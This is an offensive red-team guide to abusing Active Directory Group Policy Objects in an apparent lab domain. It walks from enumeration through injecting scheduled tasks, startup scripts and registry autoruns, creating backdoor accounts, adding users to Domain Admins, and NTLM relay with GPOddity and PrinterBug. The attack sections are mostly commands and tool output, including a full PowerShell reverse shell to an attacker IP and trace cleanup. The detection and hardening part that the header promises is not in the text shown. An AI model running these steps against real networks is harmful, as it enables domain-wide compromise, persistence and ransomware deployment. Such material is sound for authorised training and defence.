---
title: "GPO Abuse — Deep Dive into Group Policy Object Attacks"
date: 2026-03-18 22:00:00 +0200
categories: [Active Directory, GPO Attacks]
tags: [active-directory, red-team, GPO, group-policy, SharpGPOAbuse, pyGPOAbuse, GPOddity, Group3r, BloodHound, DACL, persistence, lateral-movement, privilege-escalation, MITRE-T1484]
description: "Complete offensive guide to GPO abuse in Active Directory — enumeration, creating/editing/linking GPOs, abusing users with write/create/link rights from both Linux and Windows, immediate tasks, startup scripts, user rights, SeEnableDelegationPrivilege, GPOddity NTLM relay, and full detection/hardening."
image:
  path: /assets/img/posts/gpo-abuse/banner.png
  alt: "GPO Abuse — Active Directory Red Team Deep Dive"
toc: true
---

## Overview

Group Policy Objects (GPOs) are one of the most powerful management features in Active Directory — and one of the most dangerous attack surfaces when misconfigured. A single misconfigured GPO right can give an attacker **code execution as SYSTEM** on every machine in an OU, the ability to **add Domain Admins**, disable security tools, or deploy ransomware domain-wide.

According to [MITRE ATT&CK](https://attack.mitre.org/techniques/T1484/001/), GPO abuse has been used in production attacks by:

| Threat Actor | Campaign |
|---|---|
| **Sandworm Team** | 2022 Ukraine Electric Power Attack — deployed malware via GPO |
| **APT41** | Used GPO-scheduled tasks to deploy ransomware |
| **Cinnamon Tempest** | Used GPO batch scripts for ransomware deployment |
| **HermeticWiper** | Deployed via Default Domain Policy from DC |
| **Prestige Ransomware** | Deployed via Default Domain Group Policy |
| **Qilin Ransomware** | Pushed scheduled tasks via GPO for payload execution |

This guide covers everything from the basics to advanced GPO exploitation techniques — creating new GPOs, editing existing ones, linking them to OUs, enumerating who can do it, and exploiting it all from both Linux and Windows.

---

## MITRE ATT&CK Mapping

| ID | Technique | Tactic |
|---|---|---|
| [T1484](https://attack.mitre.org/techniques/T1484/) | Domain or Tenant Policy Modification | Defense Evasion, Privilege Escalation |
| [T1484.001](https://attack.mitre.org/techniques/T1484/001/) | Group Policy Modification | Defense Evasion, Privilege Escalation |
| [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task — via GPO immediate task | Persistence, Execution |
| [T1037.003](https://attack.mitre.org/techniques/T1037/003/) | Network Logon Script — via GPO | Persistence |
| [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Registry Run Keys / Startup Folder — via GPO | Persistence |
| [T1098](https://attack.mitre.org/techniques/T1098/) | Account Manipulation — add local admin via GPO | Persistence |
| [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | Impair Defenses — disable AV/FW via GPO | Defense Evasion |

---

## GPO Architecture

Understanding GPO internals is essential before attacking them.

```
GPO Structure in Active Directory
═══════════════════════════════════════════════════════════════════════

  Active Directory (LDAP)
  ┌──────────────────────────────────────────────────────────────┐
  │  Group Policy Container (GPC)                                │
  │  CN={GUID},CN=Policies,CN=System,DC=inlanefreight,DC=local   │
  │                                                              │
  │  Key Attributes:                                             │
  │  ├─ displayName       → "Default Domain Policy"              │
  │  ├─ gPCFileSysPath    → \\DC01\SYSVOL\domain\Policies\{GUID} │
  │  ├─ versionNumber     → increments on each edit              │
  │  └─ gPCMachineExtensionNames / gPCUserExtensionNames         │
  └──────────────────────────────────────────────────────────────┘
           │
           │ Points to
           ▼
  SYSVOL File System
  ┌──────────────────────────────────────────────────────────────┐
  │  Group Policy Template (GPT)                                 │
  │  \\DC01\SYSVOL\inlanefreight.local\Policies\{GUID}\           │
  │  ├─ GPT.INI                  → version tracking              │
  │  ├─ Machine\                 → computer settings             │
  │  │   ├─ Microsoft\Windows NT\SecEdit\GptTmpl.inf             │
  │  │   │   → User rights, restricted groups, privileges        │
  │  │   └─ Preferences\ScheduledTasks\ScheduledTasks.xml        │
  │  │       → Immediate scheduled tasks (attack vector)         │
  │  └─ User\                    → user settings                 │
  │      └─ Scripts\             → logon/logoff scripts          │
  └──────────────────────────────────────────────────────────────┘
           │
           │ Linked to
           ▼
  OU / Domain / Site
  ┌──────────────────────────────────────────────────────────────┐
  │  gpLink attribute on the OU LDAP object:                     │
  │  [LDAP://CN={GUID},CN=Policies...;0]                         │
  │  → 0 = Enabled, 1 = Disabled, 2 = Enforced                  │
  └──────────────────────────────────────────────────────────────┘
```

### Who Controls What

| Right | What it Allows | Where Checked |
|---|---|---|
| **CreateChild on CN=Policies** | Create new GPOs in the domain | LDAP ACL on Policies container |
| **WriteProperty/GenericWrite on GPO** | Edit GPO settings | LDAP ACL on the GPC object |
| **WriteDACL on GPO** | Change GPO permissions | LDAP ACL on the GPC object |
| **Write on SYSVOL GPT folder** | Modify GPO files directly | NTFS/SMB ACL on SYSVOL |
| **WriteProperty on gpLink on OU** | Link a GPO to an OU | LDAP ACL on the OU object |
| **GenericAll on OU** | Full control, including linking GPOs | LDAP ACL on the OU object |

---

## Scenario Setup

| Role | Username | Password | Description |
|---|---|---|---|
| Attacker | `hossam` | `HossamR3dT3am!` | Compromised domain user |
| Victim Admin | `eliot` | `EliotS3cur3!` | Has DA session on workstation |
| Domain | `inlanefreight.local` | — | |
| DC IP | `10.129.229.224` | — | |
| Attacker IP | `10.10.14.55` | — | Kali / Pwnbox |

---

## Phase 1 — Enumeration

### 1.1 Enumerate All GPOs (Windows — PowerView)

```powershell
# Import PowerView
PS C:\Users\hossam> Import-Module .\PowerView.ps1

# List all GPOs
PS C:\Users\hossam> Get-DomainGPO | select displayname, gpcfilesyspath, whenchanged

displayname                  gpcfilesyspath                                          whenchanged
-----------                  --------------                                          -----------
Default Domain Policy        \\inlanefreight.local\sysvol\...\{31B2F340-...}\        05/01/2024
Default Domain Controllers   \\inlanefreight.local\sysvol\...\{6AC1786C-...}\        05/01/2024
IT-Workstations-Policy       \\inlanefreight.local\sysvol\...\{A3B4C5D6-...}\        04/28/2024
HR-User-Settings             \\inlanefreight.local\sysvol\...\{F1E2D3C4-...}\        04/15/2024

# Map GPOs to the OUs they are linked to
PS C:\Users\hossam> Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GroupMembers

# Get all GPOs applied to a specific computer
PS C:\Users\hossam> Get-DomainGPO -ComputerIdentity WS01 -Properties displayname

# Get all GPOs applied to a specific user
PS C:\Users\hossam> Get-DomainGPO -UserIdentity eliot -Properties displayname
```

### 1.2 Enumerate All GPOs (Linux — ldapsearch)

```bash
# Enumerate all GPOs via LDAP
root@root$ ldapsearch -LLL -H ldap://10.129.229.224 \
    -x -D 'hossam@inlanefreight.local' \
    -w 'HossamR3dT3am!' \
    -b "CN=Policies,CN=System,DC=inlanefreight,DC=local" \
    "(objectClass=groupPolicyContainer)" \
    displayName gPCFileSysPath whenChanged
```

```
dn: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,...
displayName: Default Domain Policy
gPCFileSysPath: \\inlanefreight.local\sysvol\inlanefreight.local\Policies\{31B2...}
whenChanged: 20240501120000.0Z

dn: CN={A3B4C5D6-1234-5678-ABCD-EF0123456789},CN=Policies,...
displayName: IT-Workstations-Policy
gPCFileSysPath: \\inlanefreight.local\sysvol\inlanefreight.local\Policies\{A3B4...}
whenChanged: 20240428093000.0Z
```

### 1.3 Enumerate GPO Links on OUs (Windows — PowerView)

```powershell
# List all OUs with linked GPOs
PS C:\Users\hossam> Get-DomainOU | select name, gplink | Where-Object {$_.gplink}

name                gplink
----                ------
IT                  [LDAP://CN={A3B4C5D6-...},CN=Policies...;0]
HR                  [LDAP://CN={F1E2D3C4-...},CN=Policies...;0]
Workstations        [LDAP://CN={A3B4C5D6-...},CN=Policies...;0][LDAP://CN={31B2...};0]

# Full GPO → OU mapping
PS C:\Users\hossam> Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity WS01
PS C:\Users\hossam> Get-DomainGPOUserLocalGroupMapping -UserIdentity eliot
```

### 1.4 Enumerate GPO Links on OUs (Linux — ldapsearch)

```bash
# Enumerate OUs and their gpLink attribute
root@root$ ldapsearch -LLL -H ldap://10.129.229.224 \
    -x -D 'hossam@inlanefreight.local' \
    -w 'HossamR3dT3am!' \
    -b "DC=inlanefreight,DC=local" \
    "(objectClass=organizationalUnit)" \
    ou gpLink distinguishedName
```

---

## Phase 2 — Find Users Who Can Abuse GPOs

This is the most critical enumeration step. There are three distinct rights to hunt for:

```
┌─────────────────────────────────────────────────────────────────────┐
│              GPO ABUSE RIGHTS — WHAT TO HUNT FOR                    │
├─────────────────────────┬───────────────────────────────────────────┤
│  RIGHT                  │  IMPACT                                   │
├─────────────────────────┼───────────────────────────────────────────┤
│  CreateChild on         │  Can create NEW GPOs                      │
│  CN=Policies container  │                                           │
├─────────────────────────┼───────────────────────────────────────────┤
│  GenericWrite /         │  Can EDIT existing GPO settings           │
│  WriteProperty on GPO   │                                           │
├─────────────────────────┼───────────────────────────────────────────┤
│  WriteDACL on GPO       │  Can grant themselves full control        │
│                         │  of a GPO → then edit it                  │
├─────────────────────────┼───────────────────────────────────────────┤
│  GenericAll on GPO      │  Full control → edit/delete/delegate      │
├─────────────────────────┼───────────────────────────────────────────┤
│  WriteProperty on       │  Can LINK a GPO to an OU                  │
│  gpLink on OU           │  (even without edit rights on the GPO)    │
├─────────────────────────┼───────────────────────────────────────────┤
│  GenericAll on OU       │  Full control of OU → link any GPO        │
├─────────────────────────┼───────────────────────────────────────────┤
│  Group Policy           │  By default can create AND link GPOs      │
│  Creator Owners group   │  in the domain (they own the GPO)         │
└─────────────────────────┴───────────────────────────────────────────┘
```

### 2.1 Find Users Who Can Create GPOs (Windows — PowerView)

```powershell
# Users in Group Policy Creator Owners (can create + own GPOs)
PS C:\Users\hossam> Get-DomainGroupMember -Identity "Group Policy Creator Owners" -Recurse

MemberName       : hossam
MemberDomain     : inlanefreight.local
MemberSID        : S-1-5-21-3456308105-2521031762-2678499478-1108


# Who has CreateChild rights on the Policies container?
PS C:\Users\hossam> $HossamSID = (Get-DomainUser -Identity hossam).objectSID
PS C:\Users\hossam> Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=inlanefreight,DC=local" `
    -ResolveGUIDs | Where-Object {
        $_.ActiveDirectoryRights -match "CreateChild" -and
        $_.SecurityIdentifier -notmatch "S-1-5-18|S-1-5-9|DA|EA|Administrators"
    }
```

### 2.2 Find Users Who Can Edit Existing GPOs (Windows — PowerView)

```powershell
# Get all GPO ACEs — filter for non-admin write permissions
PS C:\Users\hossam> $HossamSID = (Get-DomainUser -Identity hossam).objectSID

PS C:\Users\hossam> Get-DomainGPO | ForEach-Object {
    $gpo = $_
    $gpoACL = Get-DomainObjectAcl -Identity $gpo.distinguishedname -ResolveGUIDs
    $gpoACL | Where-Object {
        $_.SecurityIdentifier -eq $HossamSID -and
        $_.ActiveDirectoryRights -match "Write|GenericAll|GenericWrite|WriteDacl|WriteOwner"
    } | Select-Object @{n='GPOName';e={$gpo.displayname}},
                      @{n='GUID';e={$gpo.name}},
                      ActiveDirectoryRights,
                      SecurityIdentifier
}

GPOName                 GUID                                    ActiveDirectoryRights
-------                 ----                                    ---------------------
IT-Workstations-Policy  {A3B4C5D6-1234-5678-ABCD-EF0123456789} GenericWrite
HR-User-Settings        {F1E2D3C4-9876-FEDC-BA98-765432109876}  WriteProperty
```

```powershell
# Shortcut — Get-DomainGPO with -GPOAdminSID (finds all GPOs hossam can edit)
PS C:\Users\hossam> Get-DomainGPO -GPOAdminSID $HossamSID | select displayname, name
```

### 2.3 Find Users Who Can Link GPOs to OUs (Windows — PowerView)

```powershell
# Who has WriteProperty on gpLink on OUs?
PS C:\Users\hossam> Get-DomainOU | ForEach-Object {
    $ou = $_
    Get-DomainObjectAcl -Identity $ou.distinguishedname -ResolveGUIDs |
    Where-Object {
        $_.ObjectAceType -match "GP-Link" -and
        $_.ActiveDirectoryRights -match "Write" -and
        $_.SecurityIdentifier -notmatch "S-1-5-18|S-1-5-9"
    } | Select-Object @{n='OU';e={$ou.name}},
                      @{n='User';e={$_.SecurityIdentifier}},
                      ActiveDirectoryRights,
                      ObjectAceType
}

OU                User                                          ActiveDirectoryRights
--                ----                                          ---------------------
IT                S-1-5-21-3456308105-...-1108 (hossam)        WriteProperty
```

### 2.4 Enumerate GPO Rights from Linux (dacledit + PywerView)

```bash
# Find all users with write rights on any GPO using dacledit
root@root$ python3 examples/dacledit.py \
    -action read \
    -target-dn "CN=Policies,CN=System,DC=inlanefreight,DC=local" \
    -dc-ip 10.129.229.224 \
    inlanefreight.local/hossam:HossamR3dT3am!

# Or enumerate specific GPO ACEs
root@root$ python3 examples/dacledit.py \
    -target-dn "CN={A3B4C5D6-1234-5678-ABCD-EF0123456789},CN=Policies,CN=System,DC=inlanefreight,DC=local" \
    -dc-ip 10.129.229.224 \
    inlanefreight.local/hossam:HossamR3dT3am!
```

### 2.5 BloodHound — GPO Attack Paths

BloodHound is the fastest way to visualise GPO attack paths. Run SharpHound with GPOLocalGroup:

```powershell
# Windows — collect with GPOLocalGroup
PS C:\Users\hossam> Invoke-BloodHound -CollectionMethod "All,GPOLocalGroup"

# Or run SharpHound directly
PS C:\Users\hossam> .\SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\Temp\
```

```bash
# Linux — bloodhound-python
root@root$ pip3 install bloodhound
root@root$ bloodhound-python -u hossam -p 'HossamR3dT3am!' \
    -d inlanefreight.local \
    -dc 10.129.229.224 \
    -c All,GPOLocalGroup \
    --zip
```

**Key BloodHound edges to look for:**

| BloodHound Edge | Meaning |
|---|---|
| `GenericWrite → GPO` | Can edit GPO settings |
| `WriteDACL → GPO` | Can grant yourself GenericAll on the GPO |
| `GenericAll → GPO` | Full control |
| `GenericWrite → OU` | Can modify OU including gpLink |
| `Owns → GPO` | Owner has implicit full control |
| `GPLink` | Shows which GPOs are linked to which OUs |

**BloodHound Cypher Query — Find all users with GPO write rights:**

```cypher
MATCH p=(u:User)-[r:GenericWrite|GenericAll|WriteDACL|Owns]->(g:GPO)
WHERE u.name <> "DOMAIN ADMINS@INLANEFREIGHT.LOCAL"
RETURN p

// Find users who can link GPOs to OUs
MATCH p=(u:User)-[r:GenericWrite|GenericAll]->(o:OU)
RETURN p

// Full attack path: user → GPO → OU → computers
MATCH p=(u:User)-[r1:GenericWrite]->(g:GPO)-[r2:GPLink]->(o:OU)<-[r3:Contains]-(c:Computer)
RETURN p
```

### 2.6 Group3r — Automated GPO Misconfiguration Finder

[Group3r](https://github.com/Group3r/Group3r) rapidly enumerates GPO misconfigurations across the domain.

```powershell
# Run Group3r on a domain-joined machine
PS C:\Tools> .\Group3r.exe -s -f C:\Temp\group3r.log

# Show only high-severity findings
PS C:\Tools> .\Group3r.exe -s -a 4 -f C:\Temp\group3r.log

# Show only GPOs with findings
PS C:\Tools> .\Group3r.exe -s -w -f C:\Temp\group3r.log
```

Group3r checks for:
- Scripts referencing writable shares
- MSI packages in writable locations
- Startup scripts with dangerous permissions
- Credentials embedded in GPP (Group Policy Preferences)
- Outdated software pushed via GPO
- Morphed GPO files (replication artifacts with old credentials)

---

## Phase 3 — Attack: Edit an Existing GPO

> **Condition:** `hossam` has `GenericWrite` or `WriteProperty` on the `IT-Workstations-Policy` GPO, which is linked to the `OU=IT,DC=inlanefreight,DC=local`.

```
GPO ATTACK FLOW — EDIT EXISTING GPO
═══════════════════════════════════════════════════════════════════════

  hossam ──►  GenericWrite on GPO "IT-Workstations-Policy"
                    │
                    │  GPO is linked to OU=IT
                    │  OU=IT contains WS01, WS02, WS03
                    ▼
  [Inject malicious immediate scheduled task]
                    │
                    │  Next GP refresh (every 90 mins, or forced)
                    ▼
  WS01, WS02, WS03 all execute payload as NT AUTHORITY\SYSTEM
                    │
                    ▼
  Reverse shells / lateral movement / DA escalation
```

### 3.1 SharpGPOAbuse — Add Immediate Scheduled Task (Windows)

[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) is a .NET C# tool that abuses GPO write rights.

```powershell
# Attack 1: Add an immediate computer task (runs as SYSTEM on all machines in the GPO scope)
PS C:\Users\hossam> .\SharpGPOAbuse.exe --AddComputerTask \
    --TaskName "WindowsUpdate" \
    --Author "INLANEFREIGHT\eliot" \
    --Command "cmd.exe" \
    --Arguments "/c powershell -ep bypass -w hidden -enc JABMAEgATwBTAFQAIAA9ACAAIgAxADAALgAxADAALgAxADQALgA1ADUAIg==" \
    --GPOName "IT-Workstations-Policy"

[+] Domain Controller: DC01.inlanefreight.local
[+] Domain: inlanefreight.local
[+] Distinguished Name: CN=IT-Workstations-Policy,...
[+] GUID: {A3B4C5D6-1234-5678-ABCD-EF0123456789}
[+] File path: \\inlanefreight.local\SysVol\...\ScheduledTasks.xml
[+] Done!


# Attack 2: Add an immediate USER task (runs as the user at logon)
PS C:\Users\hossam> .\SharpGPOAbuse.exe --AddUserTask \
    --TaskName "ProfileSync" \
    --Author "INLANEFREIGHT\eliot" \
    --Command "cmd.exe" \
    --Arguments "/c powershell -ep bypass -w hidden -enc JABMAEgATwBTAFQA..." \
    --GPOName "HR-User-Settings" \
    --TargetUserSID "S-1-5-21-3456308105-2521031762-2678499478-2104"


# Attack 3: Add a user to local Administrators group
PS C:\Users\hossam> .\SharpGPOAbuse.exe --AddLocalAdmin \
    --UserAccount hossam \
    --GPOName "IT-Workstations-Policy"

[+] Done! hossam will be added as a local admin on next GP refresh.


# Attack 4: Add a computer startup script
PS C:\Users\hossam> .\SharpGPOAbuse.exe --AddComputerScript \
    --ScriptName "update.bat" \
    --ScriptContents "powershell -ep bypass -w hidden -enc JABMAEgATwBT..." \
    --GPOName "IT-Workstations-Policy"


# Attack 5: Add a user logon script
PS C:\Users\hossam> .\SharpGPOAbuse.exe --AddUserScript \
    --ScriptName "logon.bat" \
    --ScriptContents "if %username%==eliot powershell -nop -w hidden -enc JABMAEg..." \
    --GPOName "HR-User-Settings"


# Attack 6: Add user rights (SeDebugPrivilege, SeBackupPrivilege, etc.)
PS C:\Users\hossam> .\SharpGPOAbuse.exe --AddUserRights \
    --UserRights "SeTakeOwnershipPrivilege,SeLoadDriverPrivilege" \
    --UserAccount hossam \
    --GPOName "IT-Workstations-Policy"


# Attack 7: Set SeEnableDelegationPrivilege (AD backdoor — gives full DA-equivalent access)
PS C:\Users\hossam> .\SharpGPOAbuse.exe --AddUserRights \
    --UserRights "SeEnableDelegationPrivilege" \
    --UserAccount hossam \
    --GPOName "Default Domain Controllers Policy"
```

> **SeEnableDelegationPrivilege** is extremely powerful — it lets the holder configure unconstrained delegation on **any** user or computer, then coerce a DC to authenticate and capture its TGT. This is a subtle AD backdoor that gives complete domain control.

### 3.2 pyGPOAbuse — Edit GPO from Linux

[pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) is the Linux equivalent of SharpGPOAbuse.

```bash
# Install
root@root$ pip3 install pygpoabuse
# or
root@root$ git clone https://github.com/Hackndo/pyGPOAbuse
cd pyGPOAbuse && pip3 install -r requirements.txt

# Attack 1: Add local admin (default action — adds hossam to local admins)
root@root$ pygpoabuse inlanefreight.local/hossam:'HossamR3dT3am!' \
    -gpo-id "A3B4C5D6-1234-5678-ABCD-EF0123456789" \
    -dc-ip 10.129.229.224

[*] "IT-Workstations-Policy" {A3B4C5D6-1234-5678-ABCD-EF0123456789}
[+] ScheduledTasks.xml written!


# Attack 2: Execute a custom command as SYSTEM
root@root$ pygpoabuse inlanefreight.local/hossam:'HossamR3dT3am!' \
    -gpo-id "A3B4C5D6-1234-5678-ABCD-EF0123456789" \
    -command "net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add" \
    -dc-ip 10.129.229.224


# Attack 3: Drop and execute a PowerShell reverse shell
root@root$ pygpoabuse inlanefreight.local/hossam:'HossamR3dT3am!' \
    -gpo-id "A3B4C5D6-1234-5678-ABCD-EF0123456789" \
    -powershell \
    -command "\$c=New-Object Net.Sockets.TCPClient('10.10.14.55',9001);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$nb=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$nb,0,\$nb.Length)}" \
    -dc-ip 10.129.229.224
    

# Attack 4: Use a computer GPO (runs as SYSTEM at next GP refresh)
root@root$ pygpoabuse inlanefreight.local/hossam:'HossamR3dT3am!' \
    -gpo-id "A3B4C5D6-1234-5678-ABCD-EF0123456789" \
    -command "net user hossam /domain && net group 'Domain Admins' hossam /add /domain" \
    -computer-script \
    -dc-ip 10.129.229.224
```

---

## Phase 4 — Attack: Create a New GPO and Link It

> **Condition:** `hossam` is a member of `Group Policy Creator Owners` (can create GPOs), AND has `WriteProperty` on `gpLink` on the `OU=IT`.

```
CREATE + LINK ATTACK FLOW
═══════════════════════════════════════════════════════════════════════

  hossam ──►  Member of "Group Policy Creator Owners"
                    │
                    │  1. Create new GPO "Windows Update Service"
                    ▼
  New GPO exists in AD with hossam as OWNER
                    │
                    │  2. Edit the GPO (hossam owns it → full control)
                    │     Inject immediate scheduled task → SYSTEM shell
                    ▼
  GPO is configured with malicious payload
                    │
                    │  3. Link GPO to OU=IT (hossam has gpLink WriteProperty)
                    ▼
  All computers in OU=IT will execute payload on next GP refresh
```

### 4.1 Create a New GPO (Windows)

```powershell
# Check if GPMC module is installed
PS C:\Users\hossam> Get-Module -List -Name GroupPolicy

# Install GPMC if needed (requires elevation)
PS C:\Users\hossam> Install-WindowsFeature -Name GPMC

# Create a new GPO
PS C:\Users\hossam> New-GPO -Name "Windows Update Service" -Domain inlanefreight.local

DisplayName      : Windows Update Service
DomainName       : inlanefreight.local
Owner            : INLANEFREIGHT\hossam
GpoStatus        : AllSettingsEnabled
...


# Create and immediately link it to an OU (one-liner)
PS C:\Users\hossam> New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=IT,DC=inlanefreight,DC=local"


# Make sure Computer Settings are enabled (required for immediate tasks)
PS C:\Users\hossam> Set-GpoStatus "Windows Update Service" -Status AllSettingsEnabled


# Add a registry autorun payload to the new GPO
PS C:\Users\hossam> Set-GPPrefRegistryValue \
    -Name "Windows Update Service" \
    -Context Computer \
    -Action Create \
    -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
    -ValueName "Updater" \
    -Value "powershell -ep bypass -w hidden -enc JABMAEgATwBTAFQA..." \
    -Type ExpandString
```

### 4.2 Link an Existing GPO to an OU (Windows)

```powershell
# Link the Default Domain Policy to IT OU (it's already created, we're just linking)
PS C:\Users\hossam> New-GPLink \
    -Name "Windows Update Service" \
    -Target "OU=IT,DC=inlanefreight,DC=local" \
    -Enforced Yes \
    -LinkEnabled Yes


# Link with enforcement (overrides Block Inheritance)
PS C:\Users\hossam> New-GPLink \
    -Name "Windows Update Service" \
    -Target "OU=IT,DC=inlanefreight,DC=local" \
    -Enforced Yes


# Check current links on the IT OU
PS C:\Users\hossam> Get-GPInheritance -Target "OU=IT,DC=inlanefreight,DC=local"

GpoLinks
--------
[Windows Update Service] Order:1 Enforced:Yes Enabled:True
[IT-Workstations-Policy] Order:2 Enforced:No  Enabled:True
```

### 4.3 Force GP Refresh (Windows)

```powershell
# Force immediate refresh on all domain computers
PS C:\Users\hossam> Get-ADComputer -Filter * | % {
    Invoke-GPUpdate -Computer $_.name -Force -RandomDelayInMinutes 0
}

# Force refresh on a single computer
PS C:\Users\hossam> Invoke-GPUpdate -Computer WS01 -Force

# Check what GPOs are currently applied to a computer
PS C:\Users\hossam> gpresult /r /s WS01
PS C:\Users\hossam> gpresult /h C:\Temp\gpo-report.html /s WS01
```

### 4.4 Create + Edit + Link from Linux (pyGPOAbuse + bloodyAD + ldapmodify)

```bash
# Step 1: Create the new GPO using bloodyAD (adds to CN=Policies)
root@root$ bloodyAD --host 10.129.229.224 \
    -d inlanefreight.local \
    -u hossam \
    -p 'HossamR3dT3am!' \
    add gpObject "Windows Update Service"

[+] New GPO created: {NEW-GUID-HERE}

# Step 2: Get the GUID of the new GPO
root@root$ ldapsearch -LLL -H ldap://10.129.229.224 \
    -x -D 'hossam@inlanefreight.local' \
    -w 'HossamR3dT3am!' \
    -b "CN=Policies,CN=System,DC=inlanefreight,DC=local" \
    "(displayName=Windows Update Service)" name

dn: CN={BBCC1234-5678-90AB-CDEF-012345678901},CN=Policies,...
name: {BBCC1234-5678-90AB-CDEF-012345678901}

# Step 3: Inject malicious immediate task into the new GPO using pyGPOAbuse
root@root$ pygpoabuse inlanefreight.local/hossam:'HossamR3dT3am!' \
    -gpo-id "BBCC1234-5678-90AB-CDEF-012345678901" \
    -command "net group 'Domain Admins' hossam /add /domain" \
    -dc-ip 10.129.229.224

[+] ScheduledTasks.xml written!

# Step 4: Link the GPO to the IT OU using ldapmodify
# First, check the current gpLink value of the OU
root@root$ ldapsearch -LLL -H ldap://10.129.229.224 \
    -x -D 'hossam@inlanefreight.local' \
    -w 'HossamR3dT3am!' \
    -b "DC=inlanefreight,DC=local" \
    "(distinguishedName=OU=IT,DC=inlanefreight,DC=local)" gpLink

dn: OU=IT,DC=inlanefreight,DC=local
gpLink: [LDAP://CN={A3B4C5D6-...},CN=Policies,CN=System,DC=inlanefreight,DC=local;0]

# Create LDIF to add the new GPO link (prepend to existing links)
cat > link.ldif << 'EOF'
dn: OU=IT,DC=inlanefreight,DC=local
changetype: modify
replace: gpLink
gpLink: [LDAP://CN={BBCC1234-5678-90AB-CDEF-012345678901},CN=Policies,CN=System,DC=inlanefreight,DC=local;0][LDAP://CN={A3B4C5D6-1234-5678-ABCD-EF0123456789},CN=Policies,CN=System,DC=inlanefreight,DC=local;0]
EOF

root@root$ ldapmodify -H ldap://10.129.229.224 \
    -x -D 'hossam@inlanefreight.local' \
    -w 'HossamR3dT3am!' \
    -f link.ldif

modifying entry "OU=IT,DC=inlanefreight,DC=local"

# Verify the link
root@root$ ldapsearch -LLL -H ldap://10.129.229.224 \
    -x -D 'hossam@inlanefreight.local' \
    -w 'HossamR3dT3am!' \
    -b "DC=inlanefreight,DC=local" \
    "(ou=IT)" gpLink
```

---

## Phase 5 — Attack: WriteDACL on GPO → Self-Grant Full Control

> **Condition:** `hossam` only has `WriteDACL` on a GPO (not GenericWrite). He can grant himself full control, then edit.

### 5.1 Self-Grant GenericAll on GPO (Windows — PowerView)

```powershell
PS C:\Users\hossam> Import-Module .\PowerView.ps1
PS C:\Users\hossam> $HossamSID = (Get-DomainUser -Identity hossam).objectSID

# Grant hossam full control on the GPO
PS C:\Users\hossam> Add-DomainObjectAcl \
    -TargetIdentity "IT-Workstations-Policy" \
    -PrincipalIdentity hossam \
    -Rights All \
    -Verbose

[+] Added ACE for hossam on IT-Workstations-Policy

# Now exploit it with SharpGPOAbuse as before
PS C:\Users\hossam> .\SharpGPOAbuse.exe --AddLocalAdmin \
    --UserAccount hossam \
    --GPOName "IT-Workstations-Policy"
```

### 5.2 Self-Grant GenericAll on GPO (Linux — dacledit)

```bash
root@root$ python3 examples/dacledit.py \
    -action write \
    -rights FullControl \
    -principal hossam \
    -target "IT-Workstations-Policy" \
    -dc-ip 10.129.229.224 \
    inlanefreight.local/hossam:HossamR3dT3am!

[*] DACL backed up to dacledit-20240501-120000.bak
[*] DACL modified successfully!

# Now exploit it with pyGPOAbuse
root@root$ pygpoabuse inlanefreight.local/hossam:'HossamR3dT3am!' \
    -gpo-id "A3B4C5D6-1234-5678-ABCD-EF0123456789" \
    -command "net group 'Domain Admins' hossam /add /domain" \
    -dc-ip 10.129.229.224
```

---

## Phase 6 — GPOddity: NTLM Relay to GPO Takeover

[GPOddity](https://github.com/synacktiv/GPOddity) by Synacktiv is a novel technique that exploits GPO ACLs purely through **NTLM relaying** — no account credentials needed beyond a machine account.

```
GPODDITY NTLM RELAY ATTACK FLOW
═══════════════════════════════════════════════════════════════════════

  1. Attacker identifies a user/machine whose NTLM auth can be relayed
     (e.g., via PrinterBug, PetitPotam, or social engineering)

  2. NTLM authentication is relayed to LDAP (LDAP signing disabled by default)
     → Attacker gets a machine account (ATTACKER$) with write rights on GPC

  3. GPOddity clones the target GPO's SYSVOL folder locally
     → Downloads all GPT files

  4. Modifies the local copy to inject a malicious immediate task

  5. Modifies gPCFileSysPath attribute (via the relayed LDAP session)
     → Points to attacker-controlled SMB share serving malicious GPT

  6. Target computers apply the malicious GPT at next GP refresh
     → Execute payload as NT AUTHORITY\SYSTEM

  7. GPOddity restores original gPCFileSysPath → cleans traces
```

```bash
# Install GPOddity
root@root$ git clone https://github.com/synacktiv/GPOddity
cd GPOddity && pip3 install -r requirements.txt

# Set up NTLM relay (in parallel, from another terminal)
root@root$ impacket-ntlmrelayx \
    -t ldap://10.129.229.224 \
    --no-smb-server \
    --no-wcf-server \
    --no-raw-server \
    -smb2support \
    --delegate-access

# Trigger NTLM auth (e.g., with PrinterBug)
root@root$ python3 printerbug.py inlanefreight.local/hossam:'HossamR3dT3am!' \
    10.129.229.224 10.10.14.55

# Run GPOddity — SMB forwarding mode (advanced, see docs)
root@root$ python3 gpoddity.py \
    -u ATTACKER\$ \
    -p 'MachineAccountPassword' \
    -d inlanefreight.local \
    --dc-ip 10.129.229.224 \
    --gpo-id "A3B4C5D6-1234-5678-ABCD-EF0123456789" \
    --command "net group 'Domain Admins' hossam /add /domain" \
    --smb-mode none

[*] Cloning GPT files from SYSVOL...
[*] Injecting malicious ScheduledTasks.xml...
[*] Modifying gPCFileSysPath to point to attacker share...
[+] Attack complete! Waiting for GP refresh...
[*] Restoring original gPCFileSysPath...
[+] Done! Traces cleaned up.
```

---

## Phase 7 — Attack: Abuse gpLink on OU (No GPO Edit Rights)

> **Condition:** `hossam` does **not** have edit rights on any GPO, but **does** have `WriteProperty` on `gpLink` on the `OU=IT`. There is a pre-existing malicious GPO elsewhere in the domain.

```powershell
# hossam already controls a GPO (e.g., created it via Creator Owners)
